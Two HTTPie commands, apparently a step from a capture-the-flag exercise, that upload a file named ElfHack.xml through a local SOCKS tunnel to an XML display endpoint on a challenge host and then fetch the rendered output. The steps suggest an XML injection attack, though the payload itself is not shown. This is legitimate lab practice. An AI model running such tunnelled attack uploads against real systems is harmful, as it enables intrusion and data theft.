http --session=eaas --form -v --proxy=http:socks5://@localhost:32080 POST http://eaas.northpolechristmastown.com/Home/DisplayXml file@../support_files/ElfHack.xml submit=Upload
http --session=eaas --form -v --proxy=http:socks5://@localhost:32080 GET http://eaas.northpolechristmastown.com/Home/DisplayXml
